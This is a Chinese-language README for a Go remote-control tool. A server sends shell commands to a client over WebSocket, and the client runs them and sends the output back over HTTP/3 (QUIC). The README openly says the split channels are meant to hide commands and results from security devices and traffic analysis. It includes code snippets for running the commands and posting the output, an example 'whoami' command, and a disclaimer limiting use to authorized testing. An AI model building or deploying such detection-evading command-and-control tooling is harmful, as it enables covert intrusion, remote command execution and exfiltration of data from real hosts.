### README (中文)

---

# WebSocket & QUIC 客户端-服务器项目

## 概述

此项目展示了基于 Go 的客户端-服务器架构，客户端通过 WebSocket 与服务器通信，并在触发某些事件时通过 HTTP/3（QUIC）发送请求。服务器使用 WebSocket 进行数据交换，同时使用 HTTP/3 发送 QUIC 请求到指定的服务器。

当服务器向客户端发送命令时，客户端执行这些命令，并将结果通过 HTTP/3 请求发送到另一台服务器。

通过不同的通道，将命令和执行结果分开可以使网络流量分析变得更加复杂，隐藏命令和结果，增加安全设备检测和分析的难度。

## 前置条件

- 已安装 Go 1.16+。
- 有效的 TLS 证书和密钥，用于安全的 WebSocket 和 HTTP/3 连接。
- 需要的依赖库：
    - [`gorilla/websocket`](https://github.com/gorilla/websocket)
    - [`quic-go/http3`](https://github.com/quic-go/quic-go)

## 安装与运行

1. **克隆仓库**：
   ```bash
   git clone https://github.com/zhangyang9123/GoWSS-QUIC/.git
   cd GoWSS-QUIC
   ```

2. **安装依赖**：
   确保安装了项目所需的 Go 模块：
   ```bash
   go mod tidy
   ```

3. **生成或配置 TLS 证书**：
   你可以使用 Let's Encrypt 或 OpenSSL 工具生成 TLS 证书和密钥。
   ```bash
   openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes
   ```

4. **启动 QUIC 服务器**：
   启动监听 `4433` 端口的 QUIC（HTTP/3）服务器：
   ```bash
   go run server.go
   ```

5. **启动 WebSocket 客户端**：
   运行客户端，它会连接到 WebSocket 服务器，并将请求发送到 QUIC 服务器：
   ```bash
   go run client.go
   ```

## 代码概览

### `server.go`

- **WebSocket 服务器**：
  WebSocket 服务器监听 `:8888` 端口。客户端连接后，服务器可以向客户端发送命令，客户端执行这些命令并返回结果。

- **QUIC 服务器**：
  QUIC 服务器通过 `:4433` 端口处理 HTTP/3 请求，客户端通过该端口发送命令执行结果。

```go
http.HandleFunc("/ws", handleWebSocket)
log.Println("WebSocket server started on :8888")
log.Fatal(http.ListenAndServeTLS(":8888", certFile, keyFile, nil))
```

### `client.go`

- **WebSocket 客户端**：
  客户端通过 TLS 安全的 WebSocket 连接（`wss://`）连接到服务器，监听服务器发送的命令，执行后将结果通过 QUIC 请求发送出去。

- **QUIC 请求**：
  在执行命令并获取结果后，客户端通过 HTTP/3 协议向 QUIC 服务器发送 POST 请求，包含执行命令的结果。

```go
cmd := exec.Command(program, args...)
output, err := cmd.CombinedOutput()
// 发送结果到 QUIC 服务器
req, err := http.NewRequestWithContext(context.Background(), http.MethodPost, "https://127.0.0.1:4433", bytes.NewReader(output))
```

## 工作原理

1. **客户端-服务器通信**：
    - 客户端连接到 WebSocket 服务器（`wss://127.0.0.1:8888/ws`）。
    - 服务器通过 WebSocket 发送命令到客户端，客户端执行命令并将结果返回。
    - 客户端将执行命令的结果通过 HTTP/3 协议发送到 QUIC 服务器（`https://127.0.0.1:4433`）。

2. **随机行为处理**：
   客户端内置了随机逻辑，可以决定是否通过 QUIC 发送命令结果。该逻辑可以根据实际需求进行调整。

## 示例

1. **启动服务器**：
   运行 WebSocket 服务器 (`server.go`)，并同时处理 QUIC 请求。

2. **启动客户端**：
   启动客户端 (`client.go`)，并连接到 WebSocket 服务器。

3. **从服务器发送命令**：
   你可以通过服务器向客户端发送如下命令：
   ```bash
   whoami
   ```

4. **查看结果**：
   客户端将执行命令，并通过 QUIC 请求将结果发送到 HTTP/3 服务器。


---
# 免责声明

此工具仅用于合法授权的企业安全建设活动。如果您需要测试此工具的可用性，请设置您自己的靶机环境。
如果您在使用本工具时有任何违法行为，您应自行承担相应后果，我们不承担任何法律或连带责任。
在安装和使用此工具之前，请仔细阅读并充分理解每一条款的内容。涉及您重要权益的限制、免责声明或其他条款可能会以粗体、下划线或其他形式突出显示。除非您已完全阅读、理解并接受本协议的所有条款，否则请勿安装和使用此工具。您对本协议的使用或任何其他明示或暗示的接受应被视为您已阅读并同意受本协议的约束。